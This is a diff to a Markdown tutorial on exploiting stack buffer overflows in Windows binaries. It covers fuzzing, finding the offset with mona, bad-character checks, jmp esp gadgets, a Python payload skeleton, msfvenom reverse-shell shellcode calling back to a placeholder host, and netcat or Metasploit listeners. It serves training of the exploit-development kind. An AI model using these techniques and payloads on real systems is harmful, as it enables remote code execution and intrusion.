@@ -15,8 +15,6 @@ To keep it simple, the steps of the Steps of this attack are as follows:
 4. [Generating payload](#generating-payload)
 5. [Getting reverse shell](#getting-reverse-shell)
 
-------------------------------
-
 ## Fuzzing
 
 My preferred way of fuzzing, although unlikely to be the most efficient, is by using msf to generate a cyclic pattern of 2048 bytes and sending it to each possible user input. If a seg fault gets raised, then great! You've found your vulnerable input, if you have checked every input and still no seg fault? Increase the length of the cyclic pattern and try again.
@@ -33,7 +31,7 @@ msf-pattern_create -l 1024
 ```
 
 **Using pwntools**  
-The first method here is preferred as you can also search the pattern
+The first method here is preferred as you can also search the pattern very easily
 ```py
 import pwn
 pattern = pwn.cyclic_gen()
@@ -102,9 +100,7 @@ Once you've got a segfault using your pattern, you can use the following command
 ```bash
 !mona findmsp
 ```
-This command will search memory for cyclic patterns and read you the value in eip, esp and ebp. It will
-
-------------------------------
+This command will search memory for cyclic patterns and read you the value in eip, esp and ebp. It will return values in each of those registers as well as giving the offset from the beginning of the cyclic pattern, which you can then use to determine the offset of your eip overwrite in your payload later on. I highly recommend tinkering with this and using either metasploit or pwntools to double check.
 
 ## Bad Characters
 One of the most crucial steps when working on buffer overflows is checking for bad characters.  
@@ -136,7 +132,7 @@ You can automate this process a bit through use of this mona command inside of I
 !mona compare -a esp -f c:\badchar_test.bin
 ```
 When the window pops up, status unmodified means that there are no more bad characters for you to remove.
-### Locating jump esp
+### Locating jmp esp
 The reason to locate a jump esp is because of the way we are structuring our payload; our shellcode will be stored in the stack at the location specified by the value stored in esp. So by overwriting eip to an address of a jmp esp gadget, we will be jumping directly to the address stored in esp and start executing our shellcode.
 
 To locate the jmp esp gadget, you can use a variety of methods. The simplest is by disassembling and/or debugging the binary and searching for yourself. In addition to this certain tools have functionalities which enable the user to search for gadgets automatically.  
@@ -144,10 +140,75 @@ To locate the jmp esp gadget, you can use a variety of methods. The simplest is 
 ```bash
 !mona jmp -r esp -cpb "\x00\x0A"
 ```
+**Using ROPgadget**
+```bash
+ROPgadget --binary ./BINARYNAME
+```
 
-------------------------------
+## Creating Payload
+The payload we will be using will be similar to the following...
+```py
+buf_totlen = 1024
+offset_srp = 146
 
-## Generating Payload
+buf = b""
+buf += b"A"*(offset_srp - len(buf)) # padding
+buf += struct.pack("<I", jmp_esp)   # SRP overwrite, jmp esp
+buf += sub_esp_10                   # Should be pointed to by ESP
+buf += shellcode_shell
+buf += b"D"*(buf_totlen - len(buf)) # Trailing padding
+buf += b"\n"
+```
+The first two lines in the above snippet set the total length of my payload, and the offset of my shellcode respectively. I choose to do it this way because not only does it keep it easy to edit, but it also ensures that it keeps program behaviour as consistent as possible. the first addition to the buffer is simply my padding, this is just an amount of A's corresponding to my given offset.  
+
+The third addition to buf is the address of one of the jmp esp gadgets located inside of the binary. This will be executed once the program hits a RET instruction. This is especially important because the value inside of esp is where the shellcode will be located on the stack.
+
+The next two additions (sub_esp_10 and shellcode_shell) are both shellcode. The purpose of sub_esp_10 is to perform the assembly instructions `sub esp, 0x10`. This subtracts 16 from the value stored in ESP, moving it that many bytes away from the shellcode. This is done instead of using a NOP sled, which uses many many more bytes inside of the payload and is also a lot more buggy. The reason this is done is because the shellcode to spawn the shell is encoded due to having to avoid bad characters. That means a decoder stub must be prepended to the shellcode itself. The issue here is that the stub can blow a massive hole in the memory stored around the esp, which is of course an issue due to our shellcode being stored there which is why the esp is being moved 16 bytes away. shellcode_shell just contains the shellcode generated through msfvenom using the command below with a windows/shell_reverse_tcp payload.
+
+The trailing padding of "D"'s and the "\n" byte is to both ensure that my input to the binary is of a specific length, and to ensure that the string is read from input properly. Simple stuff...
+
+**Generate the** `sub esp,10` **instruction**
+```bash
+msf-metasm_shell
+
+type "exit" or "quit" to quit
+use ";" or "\n" for newline
+type "file <file>" to parse a GAS assembler source file
+metasm > sub esp,0x10
+"\x83\xec\x10"
+metasm > quit
+```
+
+**pop calc**
 ```bash
 msfvenom -p windows/exec -b '\x00\x0A' -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread
 ```
+
+**reverse shell**
+```bash
+msfvenom -p windows/shell_reverse_tcp -b '\x00\x0A' -f python --var-name shellcode_shell LHOST="IPHERE" LPORT=4444 EXITFUNC=thread
+```
+
+## Getting Reverse Shell
+
+Once you have your exploit code written it is simple enough to get a remote shell back to you. I would highly recommend just trying to pop calc before hand, this is because catching a reverse shell is another level of things to go wrong with the exploit and it's much better to troubleshoot whether your shellcode is working or not by using a simple shellcode command beforehand to make sure it's being executed correctly in the first place...
+
+You can simply use netcat to listen for a reverse shell connection, or you can use metasploits multi handler, snippets for both are below. Once you have the listener set up using either method, simply run your exploit script and you *should* have a shell!
+**Using netcat**
+```bash
+nc -lvnp 4444
+```
+
+**Using metasploit**
+```
+msfconsole
+use exploit/multi/handler
+set payload windows/shell_reverse_tcp
+set LHOST IPHERE
+set LPORT 4444
+run
+```
+
+-------------------
+
+That's all, hope you found it useful :)
